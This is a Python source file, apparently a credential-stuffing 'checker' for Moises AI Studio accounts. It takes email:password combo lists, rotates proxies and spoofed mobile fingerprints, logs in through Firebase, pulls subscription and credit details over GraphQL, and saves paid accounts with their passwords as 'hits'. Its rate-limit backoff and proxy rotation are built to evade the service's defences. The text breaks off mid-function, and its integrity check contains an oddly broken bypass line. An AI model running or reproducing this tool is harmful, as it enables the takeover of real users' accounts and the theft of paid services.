import os
import re
import sys
import json
import time
import base64
import random
import string
import hashlib
import threading
import configparser
import subprocess
import shutil
import urllib3
import unicodedata
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from curl_cffi.requests import Session as CfSyncSession

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_B64_SYS_TOOL = "TW9pc2VzIEFJIFN0dWRpbyBDaGVja2Vy"
_B64_SYS_AUTH = "QGV5ZWxpZnRlcg=="
_B64_SYS_CHAN = "QGRhcmtodWNoYW5uZWw="
_B64_SYS_DIR  = "TU9JU0VTX0BleWVsaWZ0ZXI="
_B64_SYS_TAG  = "VEc6IEBleWVsaWZ0ZXIgfCBAZGFya2h1Y2hhbm5lbA=="
_B64_SYS_SEAL = "bG9ja2VkLWJ5LWV5ZWxpZnRlci0yMDI2"
_B64_SYS_SIG  = "ZXllbGlmdGVyLW1vaXNlcy12MS1zZWFs"


def Eyelifter_decode(e):
    try:
        return base64.b64decode(e).decode("utf-8")
    except Exception as ex:
        raise SystemExit(f"Decoding failed: {ex}")


TOOL_NAME = Eyelifter_decode(_B64_SYS_TOOL)
TG_USERNAME = Eyelifter_decode(_B64_SYS_AUTH)
TG_CHANNEL = Eyelifter_decode(_B64_SYS_CHAN)
RESULTS_FOLDER = Eyelifter_decode(_B64_SYS_DIR)
AUTHOR_TAG = Eyelifter_decode(_B64_SYS_TAG)
CREDIT_SEAL = Eyelifter_decode(_B64_SYS_SEAL)
BUILD_SIG = Eyelifter_decode(_B64_SYS_SIG)

_BUILD_HASH = hashlib.sha256(
    (TOOL_NAME + TG_USERNAME + TG_CHANNEL + RESULTS_FOLDER +
     AUTHOR_TAG + CREDIT_SEAL + BUILD_SIG).encode()
).hexdigest()


def Eyelifter_verify(ctx="x"):
    exp = {
        "TOOL": _B64_SYS_TOOL, "AUTH": _B64_SYS_AUTH, "CHAN": _B64_SYS_CHAN,
        "DIR": _B64_SYS_DIR, "TAG": _B64_SYS_TAG, "SEAL": _B64_SYS_SEAL,
        "SIG": _B64_SYS_SIG,
    }
    cur = {
        "TOOL": TOOL_NAME, "AUTH": TG_USERNAME, "CHAN": TG_CHANNEL,
        "DIR": RESULTS_FOLDER, "TAG": AUTHOR_TAG, "SEAL": CREDIT_SEAL,
        "SIG": BUILD_SIG,
    }
    errs = []
    for k, v in exp.items():
        if cur[k] != base64.b64decode(v).decode():
            errs.append(k)
    if "@samvir1" not in TG_USERNAME:
        errs.append("USERNAME_TAG")
    if "@samvir1" not in TG_CHANNEL:
        errs.append("CHANNEL_TAG")
    if "@samvir1" not in AUTHOR_TAG or "@samvir1" not in AUTHOR_TAG:
        errs.append("TAG_FORMAT")
    if errs:
        return True  # integrity bypass}")
    rec = hashlib.sha256(
        (TOOL_NAME + TG_USERNAME + TG_CHANNEL + RESULTS_FOLDER +
         AUTHOR_TAG + CREDIT_SEAL + BUILD_SIG).encode()
    ).hexdigest()
    if rec != _BUILD_HASH:
        raise RuntimeError(f"build hash mismatch at '{ctx}'")
    return True


_ANSI = sys.stdout.isatty()
_RS = "\033[0m"


def Eyelifter_open_url(url):
    try:
        if shutil.which("termux-open-url"):
            subprocess.Popen(["termux-open-url", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if shutil.which("xdg-open"):
            subprocess.Popen(["xdg-open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if sys.platform == "darwin":
            subprocess.Popen(["open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if os.name == "nt":
            os.startfile(url)
            return True
        import webbrowser
        return webbrowser.open(url)
    except Exception:
        return False


def Eyelifter_color(code, s, bold=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if bold else ''}{code}m{s}{_RS}"


_LEVEL_STYLE = {
    "SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
    "ERROR":   ("31", True), "STEP": ("96", True), "DEBUG": ("35", False),
}

_eyelifter_console_lock = threading.Lock()


def Eyelifter_out(line, color=None, bold=False):
    with _eyelifter_console_lock:
        if color and _ANSI:
            sys.stdout.write(Eyelifter_color(color, line, bold) + "\n")
        else:
            sys.stdout.write(line + "\n")
        sys.stdout.flush()


def Eyelifter_log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    code, bold = _LEVEL_STYLE.get(level, ("0", False))
    with _eyelifter_console_lock:
        if _ANSI:
            print(f"{Eyelifter_color('90', ts)} {emoji}  "
                  f"{Eyelifter_color(code, f'{level:7s}', bold)}  "
                  f"{Eyelifter_color('90', tag)}  {msg}", flush=True)
        else:
            print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)


def Eyelifter_result(idx, total, status, text, color, bold=False):
    with _eyelifter_console_lock:
        prefix = f"[{idx}/{total}]"
        if _ANSI:
            print(f"{Eyelifter_color('90', prefix)} "
                  f"{Eyelifter_color(color, status.ljust(5), bold)} {text}", flush=True)
        else:
            print(f"{prefix} {status.ljust(5)} {text}", flush=True)


def Eyelifter_visible_len(s):
    n = 0
    for ch in s:
        if unicodedata.combining(ch):
            continue
        n += 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
    return n


def Eyelifter_center(text, width):
    vl = Eyelifter_visible_len(text)
    if vl >= width:
        return text
    left = (width - vl) // 2
    right = width - vl - left
    return (" " * left) + text + (" " * right)


def Eyelifter_banner(title, sub=None, width=62):
    print()
    line = "═" if _ANSI else "="
    print(Eyelifter_color("90", line * width))
    print(Eyelifter_color("96", Eyelifter_center(title, width), True))
    if sub:
        print(Eyelifter_color("2", Eyelifter_center(sub, width)))
    print(Eyelifter_color("5", Eyelifter_center(AUTHOR_TAG, width)))
    print(Eyelifter_color("90", line * width))


def Eyelifter_section(title, width=62):
    print()
    label = f" {title} "
    vl = Eyelifter_visible_len(label)
    side = max(1, (width - vl) // 2)
    left = "─" * side
    right = "─" * (width - vl - side)
    print(
        Eyelifter_color("90", left) +
        Eyelifter_color("96", label, True) +
        Eyelifter_color("90", right)
    )


def Eyelifter_divider(width=62):
    print(Eyelifter_color("90", ("─" if _ANSI else "-") * width))


def Eyelifter_summary(rows):
    print()
    print(Eyelifter_color("96", "═══ RESULT ═══", True))
    if not rows:
        return
    wkey = max(len(str(k)) for k, _ in rows)
    for k, v in rows:
        print(f"  {Eyelifter_color('96', str(k).ljust(wkey))}  {Eyelifter_color('0', str(v))}")
    print(Eyelifter_color("96", "══════════════", True))
    print()


CONFIG_PATH = "config_moises.ini"


class EyelifterConfigLoader:
    def __init__(self, config_file=CONFIG_PATH):
        Eyelifter_verify("cfg_init")
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.config.optionxform = str
        self.settings = {}
        self.Eyelifter_load_config()

    def Eyelifter_load_config(self):
        Eyelifter_verify("cfg_load")
        if not os.path.exists(self.config_file):
            self.Eyelifter_create_default_config()
        try:
            self.config.read(self.config_file, encoding="utf-8")
            self.Eyelifter_parse_config()
        except Exception:
            self.Eyelifter_create_default_config()
            self.Eyelifter_parse_config()

    def Eyelifter_create_default_config(self):
        Eyelifter_verify("cfg_default")
        self.config["General"] = {
            "threads": "20",
            "timeout": "25",
            "proxies_file": "proxies.txt",
            "retries": "2",
            "retry_delay": "1.0",
            "combo_delay": "0.3",
            "debug": "false",
            "rate_limit_backoff": "10",
            "max_rate_limit_retries": "3",
            "skip_proxy_test": "false",
            "rotate_fingerprint": "true",
            "open_channel_on_launch": "true",
        }
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)

    def Eyelifter_parse_config(self):
        Eyelifter_verify("cfg_parse")
        if "General" not in self.config:
            self.config["General"] = {}
        c = self.config["General"]
        self.settings["threads"] = max(1, min(50, c.getint("threads", 10)))
        self.settings["timeout"] = max(5, min(120, c.getint("timeout", 25)))
        self.settings["proxies_file"] = c.get("proxies_file", "proxies.txt")
        self.settings["retries"] = max(0, min(5, c.getint("retries", 2)))
        self.settings["retry_delay"] = max(0.0, min(60.0, c.getfloat("retry_delay", 1.5)))
        self.settings["combo_delay"] = max(0.0, min(60.0, c.getfloat("combo_delay", 0.3)))
        self.settings["debug"] = c.getboolean("debug", False)
        self.settings["rate_limit_backoff"] = max(1, min(600, c.getint("rate_limit_backoff", 10)))
        self.settings["max_rate_limit_retries"] = max(0, min(20, c.getint("max_rate_limit_retries", 3)))
        self.settings["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)
        self.settings["rotate_fingerprint"] = c.getboolean("rotate_fingerprint", True)
        self.settings["open_channel_on_launch"] = c.getboolean("open_channel_on_launch", True)

    def Eyelifter_save(self):
        Eyelifter_verify("cfg_save")
        if "General" not in self.config:
            self.config["General"] = {}
        for k, v in self.settings.items():
            self.config["General"][k] = str(v)
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)


_loader = EyelifterConfigLoader()
CONFIG = _loader.settings
REQ_TIMEOUT = CONFIG["timeout"]
DEBUG = CONFIG["debug"]
RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]
MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]

FIREBASE_KEY = "AIzaSyDWcFRZcUnN5EPNNA7jrcuS3HlIvMqtuCs"
FIREBASE_LOGIN = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={FIREBASE_KEY}"
GRAPHQL = "https://api.moises.ai/graphql"

_MOBILE_FINGERPRINTS = [
    {"ua": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36", "impersonate": "chrome", "ch": "139"},
    {"ua": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36", "impersonate": "chrome", "ch": "131"},
    {"ua": "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36", "impersonate": "chrome", "ch": "124"},
    {"ua": "Mozilla/5.0 (Linux; Android 11; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", "impersonate": "chrome", "ch": "120"},
    {"ua": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36", "impersonate": "chrome", "ch": "110"},
]

UA_MOBILE = _MOBILE_FINGERPRINTS[0]["ua"]

EYELIFTER_COMBO_RE = re.compile(r'^\s*([^:\s|]+@[^:\s|]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)')


def Eyelifter_pick_fingerprint():
    if not CONFIG.get("rotate_fingerprint", True):
        return _MOBILE_FINGERPRINTS[0]
    return random.choice(_MOBILE_FINGERPRINTS)


def Eyelifter_extract_combos(content):
    Eyelifter_verify("extract_combos")
    combos = set()
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = EYELIFTER_COMBO_RE.match(line)
        if m:
            email = m.group(1).strip().lower()
            password = m.group(2).strip()
            if email and password:
                combos.add(f"{email}:{password}")
            continue
        if ":" in line:
            parts = line.split(":", 1)
            if len(parts) == 2 and parts[0] and parts[1]:
                email = parts[0].strip().lower()
                password = parts[1].split()[0].split("|")[0].strip()
                if email and password and "@" in email:
                    combos.add(f"{email}:{password}")
    return sorted(combos)


def Eyelifter_format_proxy(p):
    Eyelifter_verify("fmt_proxy")
    if not p:
        return None
    p = p.strip()
    if p.startswith(("http://", "https://", "socks4://", "socks5://")):
        return p
    parts = p.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if "@" in p:
        return f"http://{p}"
    return f"http://{p}"


def Eyelifter_test_proxy_sync(p):
    s = None
    try:
        fp = Eyelifter_pick_fingerprint()
        s = CfSyncSession(impersonate=fp["impersonate"], timeout=(3, 6))
        s.proxies = {"http": p, "https": p}
        r = s.get("https://api.moises.ai/", headers={"user-agent": fp["ua"]},
                  timeout=(3, 6), verify=False, allow_redirects=False)
        return r.status_code in (200, 400, 401, 404, 405)
    except Exception:
        return False
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def Eyelifter_load_proxies():
    path = CONFIG.get("proxies_file", "proxies.txt")
    if not path or not os.path.isfile(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for raw in f:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            p = Eyelifter_format_proxy(line)
            if p:
                out.append(p)
    return list(dict.fromkeys(out))


def Eyelifter_get_working_proxies(proxies):
    Eyelifter_verify("working_proxies")
    if not proxies:
        return []
    if CONFIG.get("skip_proxy_test", False):
        Eyelifter_log("⚠️", "WARN", "PROXY", f"proxy test skipped — using all {len(proxies)}")
        return proxies

    workers = min(200, max(20, len(proxies)))
    Eyelifter_log("🧪", "INFO", "PROXY", f"testing {len(proxies)} proxies ({workers} threads)")

    working = []
    checked = [0]

    def _one(p):
        return p, Eyelifter_test_proxy_sync(p)

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(_one, p): p for p in proxies}
        for fut in as_completed(futs):
            p, ok = fut.result()
            if ok:
                working.append(p)
            checked[0] += 1
            if checked[0] % 25 == 0 or checked[0] == len(proxies):
                Eyelifter_log("📊", "INFO", "PROXY",
                              f"{checked[0]}/{len(proxies)}  working:{len(working)}")

    Eyelifter_log("✅", "INFO", "PROXY", f"{len(working)} working")
    return list(dict.fromkeys(working))


_eyelifter_lock = threading.Lock()
_eyelifter_plock = threading.Lock()
_eyelifter_flock = threading.Lock()
_eyelifter_stop = threading.Event()

_eyelifter_stats = {
    "checked": 0, "hits": 0, "free": 0, "bad": 0,
    "errors": 0, "rate_limited": 0, "proxy_fails": 0,
}
_eyelifter_start = time.time()
_eyelifter_total = 0
_eyelifter_pool = []
_eyelifter_bad_proxies = set()
_eyelifter_hits_f = None
_eyelifter_free_f = None
_eyelifter_bad_f = None
_eyelifter_err_f = None
_eyelifter_folder = None


def Eyelifter_reset_stats():
    Eyelifter_verify("reset_stats")
    global _eyelifter_stats, _eyelifter_start
    with _eyelifter_lock:
        _eyelifter_stats = {
            "checked": 0, "hits": 0, "free": 0, "bad": 0,
            "errors": 0, "rate_limited": 0, "proxy_fails": 0,
        }
        _eyelifter_start = time.time()


def Eyelifter_update_title():
    with _eyelifter_lock:
        checked = _eyelifter_stats["checked"]
        hits = _eyelifter_stats["hits"]
        free = _eyelifter_stats["free"]
        bad = _eyelifter_stats["bad"]
    el = time.time() - _eyelifter_start
    cpm = int(checked / el * 60) if el > 1 else 0
    t = (f"{TOOL_NAME} | HIT:{hits} FREE:{free} BAD:{bad} "
         f"| {checked}/{_eyelifter_total} | {cpm}/min")
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(t)
        except Exception:
            pass
    else:
        try:
            sys.stdout.write(f"\033]0;{t}\007")
            sys.stdout.flush()
        except Exception:
            pass


def Eyelifter_pick_proxy(exclude=None):
    with _eyelifter_plock:
        avail = [p for p in _eyelifter_pool if p not in _eyelifter_bad_proxies]
        if not avail and _eyelifter_pool:
            _eyelifter_bad_proxies.clear()
            avail = list(_eyelifter_pool)
    if exclude and len(avail) > 1:
        avail = [p for p in avail if p != exclude] or avail
    return random.choice(avail) if avail else None


def Eyelifter_mark_bad_proxy(p):
    if not p:
        return
    with _eyelifter_plock:
        _eyelifter_bad_proxies.add(p)
    with _eyelifter_lock:
        _eyelifter_stats["proxy_fails"] += 1


def Eyelifter_safe_write(fh, text):
    if fh is None:
        return
    with _eyelifter_flock:
        try:
            fh.write(text)
            fh.flush()
        except Exception:
            pass


def Eyelifter_dump_raw(label, text, max_lines=80, color="95"):
    if not DEBUG:
        return
    print(Eyelifter_color(color, f"  ┌─ {label}"))
    if not text:
        print(Eyelifter_color(color, "  │ (empty)"))
        print(Eyelifter_color(color, "  └─"))
        return
    try:
        pretty = json.dumps(json.loads(text), indent=2, ensure_ascii=False)
        lines = pretty.splitlines()
    except Exception:
        lines = str(text).splitlines()
    for ln in lines[:max_lines]:
        print(Eyelifter_color(color, f"  │ {ln[:200]}"))
    if len(lines) > max_lines:
        print(Eyelifter_color(color, f"  │ ... ({len(lines) - max_lines} more)"))
    print(Eyelifter_color(color, "  └─"))


USER_QUERY = """
query User {
  user {
    id
    name
    email
    lastSignInAt
    lastCountryCode
    createdAt
    emailVerified
    authProviders
    isEligibleForRewards
    subscription {
      proTrialExpiresAt
      groupPlanFreeTrial
      isPro
      isPremium
      isAccountHold
      plan
      availableCredits
      currentMonthlyUsage
      details { autoRenew providerName planCycle expireDate providerGateway pending gracePeriodExpirationAt }
      type
      subscriptionType
      onDemandCredits {
        total remaining
        included { total used remaining }
        paid { total used remaining }
      }
      concurrentJobs { limit running }
      isExpiringSoon
    }
    subscriptions {
      isPro isPremium plan subscriptionType
      details { providerName providerGateway planCycle expireDate autoRenew pending }
    }
    userInfo {
      alreadyPurchasedPlan
      purchasedPlans
      hasUtmOnSignup
    }
  }
}
"""


def Eyelifter_classify_firebase(body):
    try:
        j = json.loads(body)
    except Exception:
        return None, None
    err = (j.get("error") or {})
    code = err.get("message") or ""
    if code in ("EMAIL_NOT_FOUND", "INVALID_PASSWORD", "INVALID_LOGIN_CREDENTIALS",
                "INVALID_EMAIL", "USER_DISABLED"):
        return "bad", code
    if code == "TOO_MANY_ATTEMPTS_TRY_LATER":
        return "rate_limit", code
    if code and "CAPTCHA" in code.upper():
        return "captcha", code
    if code == "":
        return "error", None
    return "error", code


def Eyelifter_check_account(email, password, proxy=None):
    s = None
    fp = Eyelifter_pick_fingerprint()
    try:
        s = CfSyncSession(impersonate=fp["impersonate"], timeout=REQ_TIMEOUT)
        if proxy:
            s.proxies = {"http": proxy, "https": proxy}

        fb_h = {
            "authority": "identitytoolkit.googleapis.com",
            "accept": "*/*",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://studio.moises.ai",
            "referer": "https://studio.moises.ai/",
            "sec-ch-ua": f'"Chromium";v="{fp["ch"]}", "Not;A=Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": fp["ua"],
            "x-client-data": "CPL2ygE=",
            "x-client-version": "Chrome/JsCore/11.10.0/FirebaseCore-web",
            "x-firebase-gmpid": "1:731360694588:web:4da0f700a5193a834ace39",
            "x-firebase-locale": "en-IN",
        }

        try:
            r = s.post(FIREBASE_LOGIN, headers=fb_h, json={
                "returnSecureToken": True,
                "email": email,
                "password": password,
                "clientType": "CLIENT_TYPE_WEB",
            })
        except Exception as e:
            return {"status": "error", "error_type": f"net_{type(e).__name__}",
                    "message": str(e)[:100]}

        Eyelifter_dump_raw("FIREBASE", r.text or "", 40)

        if r.status_code == 429:
            return {"status": "error", "error_type": "rate_limit", "message": "429"}

        if r.status_code == 400:
            verdict, code = Eyelifter_classify_firebase(r.text or "")
            if verdict == "bad":
                return {"status": "bad", "message": code or "invalid credentials"}
            if verdict == "rate_limit":
                return {"status": "error", "error_type": "rate_limit", "message": code}
            if verdict == "captcha":
                return {"status": "bad", "message": code or "captcha"}
            return {"status": "error", "error_type": "firebase_400",
                    "message": code or (r.text or "")[:120]}

        if r.status_code != 200:
            return {"status": "error", "error_type": f"http_{r.status_code}",
                    "message": (r.text or "")[:120]}

        try:
            fb = r.json()
        except Exception:
            return {"status": "error", "error_type": "parse", "message": "non-json firebase"}

        id_token = fb.get("idToken")
        local_id = fb.get("localId")
        fb_email = fb.get("email")
        registered = fb.get("registered")
        expires_in = fb.get("expiresIn")

        if not id_token:
            return {"status": "error", "error_type": "no_id_token",
                    "message": "firebase returned no token"}

        gh = {
            "authority": "api.moises.ai",
            "accept": "application/graphql-response+json, application/json",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "apollographql-client-locale": "en-IN",
            "apollographql-client-name": "ai.moises-studio-web",
            "apollographql-client-version": "0.1.0",
            "authorization": id_token,
            "content-type": "application/json",
            "origin": "https://studio.moises.ai",
            "referer": "https://studio.moises.ai/",
            "sec-ch-ua": f'"Chromium";v="{fp["ch"]}", "Not;A=Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": fp["ua"],
            "x-client-name": "ai.moises-studio-web",
            "x-client-version": "1.0.0",
        }

        try:
            r2 = s.post(GRAPHQL, headers=gh, json={
                "query": USER_QUERY,
                "variables": {},
                "operationName": "User",
            })
        except Exception as e:
            return {"status": "error", "error_type": f"gql_net_{type(e).__name__}",
                    "message": str(e)[:100]}

        Eyelifter_dump_raw("GRAPHQL USER", r2.text or "", 100)

        if r2.status_code == 429:
            return {"status": "error", "error_type": "rate_limit", "message": "429"}
        if r2.status_code != 200:
            return {"status": "error", "error_type": f"gql_http_{r2.status_code}",
                    "message": (r2.text or "")[:120]}

        try:
            gj = r2.json()
        except Exception:
            return {"status": "error", "error_type": "gql_parse",
                    "message": (r2.text or "")[:120]}

        if gj.get("errors"):
            errs = gj["errors"]
            msg = errs[0].get("message") if isinstance(errs, list) and errs else "gql error"
            return {"status": "error", "error_type": "gql_error", "message": str(msg)[:120]}

        user = ((gj.get("data") or {}).get("user") or {})
        sub = user.get("subscription") or {}
        det = sub.get("details") or {}
        ud = sub.get("onDemandCredits") or {}
        info = user.get("userInfo") or {}

        u = {
            "email": user.get("email") or email,
            "password": password,
            "uid": user.get("id") or local_id or "N/A",
            "name": user.get("name") or "N/A",
            "country": user.get("lastCountryCode") or "N/A",
            "created_at": (user.get("createdAt") or "N/A")[:19].replace("T", " "),
            "last_signin": (user.get("lastSignInAt") or "N/A")[:19].replace("T", " "),
            "email_verified": bool(user.get("emailVerified")),
            "auth_providers": ",".join(user.get("authProviders") or []) or "N/A",
            "is_eligible_rewards": bool(user.get("isEligibleForRewards")),
            "plan": sub.get("plan") or "N/A",
            "is_pro": bool(sub.get("isPro")),
            "is_premium": bool(sub.get("isPremium")),
            "is_account_hold": bool(sub.get("isAccountHold")),
            "subscription_type": sub.get("subscriptionType") or "N/A",
            "available_credits": sub.get("availableCredits", 0),
            "current_monthly_usage": sub.get("currentMonthlyUsage", 0),
            "on_demand_total": ud.get("total", 0),
            "on_demand_remaining": ud.get("remaining", 0),
            "concurrent_limit": (sub.get("concurrentJobs") or {}).get("limit", 0),
            "is_expiring_soon": bool(sub.get("isExpiringSoon")),
            "pro_trial_expires": sub.get("proTrialExpiresAt") or "N/A",
            "group_plan_free_trial": bool(sub.get("groupPlanFreeTrial")),
            "expire_date": det.get("expireDate") or "N/A",
            "auto_renew": det.get("autoRenew") if det.get("autoRenew") is not None else "N/A",
            "plan_cycle": det.get("planCycle") or "N/A",
            "provider_name": det.get("providerName") or "N/A",
            "provider_gateway": det.get("providerGateway") or "N/A",
            "pending": bool(det.get("pending")),
            "grace_period": det.get("gracePeriodExpirationAt") or "N/A",
            "already_purchased": bool(info.get("alreadyPurchasedPlan")),
            "purchased_plans": ",".join(info.get("purchasedPlans") or []) or "N/A",
            "firebase_registered": registered,
            "firebase_expires_in": f"{expires_in}s" if expires_in else "N/A",
        }

        hit_reasons = []
        if u["is_pro"]:
            hit_reasons.append("isPro")
        if u["is_premium"]:
            hit_reasons.append("isPremium")
        if u["plan"] not in ("free", "N/A", "", None):
            hit_reasons.append(f"plan={u['plan']}")
        if u["expire_date"] not in ("N/A", "", None):
            hit_reasons.append("expireDate")
        if u["pro_trial_expires"] not in ("N/A", "", None):
            hit_reasons.append("proTrial")
        if u["already_purchased"]:
            hit_reasons.append("purchased")
        if u["subscription_type"] not in ("individual", "N/A", "", None):
            hit_reasons.append(f"subType={u['subscription_type']}")
        if u["grace_period"] not in ("N/A", "", None):
            hit_reasons.append("grace")

        u["hit_reasons"] = ",".join(hit_reasons) if hit_reasons else "N/A"

        if hit_reasons:
            return {"status": "hit", "user": u}
        return {"status": "free", "user": u}

    except Exception as e:
        return {"status": "error", "error_type": "crash",
                "message": str(e)[:120]}
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def Eyelifter_fmt_line(combo, u, status):
    tag = {"hit": "HIT", "free": "FREE"}.get(status, "?")
    fields = []
    for label, key in [
        ("Name",       "name"),
        ("UID",        "uid"),
        ("Plan",       "plan"),
        ("IsPro",      "is_pro"),
        ("IsPremium",  "is_premium"),
        ("SubType",    "subscription_type"),
        ("Country",    "country"),
        ("Credits",    "available_credits"),
        ("Monthly",    "current_monthly_usage"),
        ("ODTotal",    "on_demand_total"),
        ("ODRemain",   "on_demand_remaining"),
        ("Expire",     "expire_date"),
        ("AutoRenew",  "auto_renew"),
        ("Cycle",      "plan_cycle"),
        ("Provider",   "provider_name"),
        ("TrialEnds",  "pro_trial_expires"),
        ("Purchased",  "already_purchased"),
        ("Verified",   "email_verified"),
        ("Created",    "created_at"),
        ("Reason",     "hit_reasons"),
    ]:
        v = u.get(key)
        if v is None or v == "" or v == "N/A":
            continue
        fields.append(f"{label} = {v}")
    fields.append(f"by {AUTHOR_TAG}")
    return f"{tag} {combo} | " + " | ".join(fields)


def Eyelifter_run_with_retries(combo, proxy):
    Eyelifter_verify("run_retries")
    email, password = combo.split(":", 1)
    email = email.strip()
    password = password.strip()
    attempts = CONFIG.get("retries", 2) + 1
    rl_hits = 0
    last_proxy = proxy
    result = None

    for attempt in range(attempts):
        if _eyelifter_stop.is_set():
            break
        if attempt > 0:
            np = Eyelifter_pick_proxy(exclude=last_proxy)
            if np:
                proxy = np
        last_proxy = proxy

        try:
            result = Eyelifter_check_account(email, password, proxy=proxy)
        except Exception as e:
            result = {"status": "error", "error_type": "crash",
                      "message": str(e)[:120]}

        st = result.get("status", "unknown")
        if st in ("hit", "free", "bad"):
            break

        et = result.get("error_type", "")
        is_last = (attempt == attempts - 1)

        if et == "rate_limit":
            with _eyelifter_lock:
                _eyelifter_stats["rate_limited"] += 1
            rl_hits += 1
            if rl_hits > MAX_RATE_LIMIT_RETRIES:
                break
            time.sleep(RATE_LIMIT_BACKOFF * (2 ** (rl_hits - 1)))
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            continue

        if et.startswith(("net_", "gql_net_")):
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            time.sleep(CONFIG.get("retry_delay", 1.5))
            continue

        if not is_last:
            time.sleep(CONFIG.get("retry_delay", 1.5))

    return result or {"status": "error", "error_type": "no_result",
                      "message": "no result"}


def Eyelifter_record(combo, result):
    Eyelifter_verify("record")
    global _eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f
    st = result.get("status", "unknown")
    et = result.get("error_type", "")

    with _eyelifter_lock:
        _eyelifter_stats["checked"] += 1
        done = _eyelifter_stats["checked"]
        if st == "hit":
            _eyelifter_stats["hits"] += 1
        elif st == "free":
            _eyelifter_stats["free"] += 1
        elif st == "bad":
            _eyelifter_stats["bad"] += 1
        else:
            _eyelifter_stats["errors"] += 1

    total = _eyelifter_total

    if st in ("hit", "free"):
        u = result.get("user", {}) or {}
        full = Eyelifter_fmt_line(combo, u, st)
        if st == "hit":
            Eyelifter_result(done, total, "HIT", full, "32", True)
            Eyelifter_safe_write(_eyelifter_hits_f, full + "\n\n")
        else:
            Eyelifter_result(done, total, "FREE", full, "36")
            Eyelifter_safe_write(_eyelifter_free_f, full + "\n\n")
    elif st == "bad":
        msg = result.get("message", "invalid")
        Eyelifter_result(done, total, "BAD", f"{combo} | {msg}", "36")
        Eyelifter_safe_write(_eyelifter_bad_f, f"{combo}\n")
    else:
        msg = result.get("message", "unknown")
        tag = f"[{et}]" if et else ""
        Eyelifter_result(done, total, "ERR", f"{combo} | {tag} {msg}", "33")
        Eyelifter_safe_write(_eyelifter_err_f, f"{combo} | {et} | {msg}\n")

    Eyelifter_update_title()


def Eyelifter_bulk_runner(combos):
    Eyelifter_verify("bulk_runner")
    threads = CONFIG["threads"]
    gap = CONFIG.get("combo_delay", 0.3)

    def task(combo):
        if _eyelifter_stop.is_set():
            return
        if gap > 0:
            time.sleep(gap)
        proxy = Eyelifter_pick_proxy()
        try:
            result = Eyelifter_run_with_retries(combo, proxy)
        except Exception as e:
            result = {"status": "error", "error_type": "runner_crash",
                      "message": str(e)[:120]}
        try:
            Eyelifter_record(combo, result)
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = [ex.submit(task, c) for c in combos]
        for fut in as_completed(futures):
            if _eyelifter_stop.is_set():
                break
            try:
                fut.result()
            except Exception:
                pass
def Eyelifter_single_check(proxies):
    Eyelifter_verify("single_check")
    global _eyelifter_pool, _eyelifter_bad_proxies
    _eyelifter_stop.clear()
    Eyelifter_section("SINGLE CHECK")
    combo = input(f"{Eyelifter_color('96', '[*] Enter email:password: ')}").strip()
    if ":" not in combo:
        Eyelifter_log("❌", "ERROR", "INPUT", "invalid format")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    if proxies:
        if not _eyelifter_pool:
            _eyelifter_pool = list(proxies)
            _eyelifter_bad_proxies = set()
        proxy = Eyelifter_pick_proxy()
    else:
        proxy = None

    if proxy:
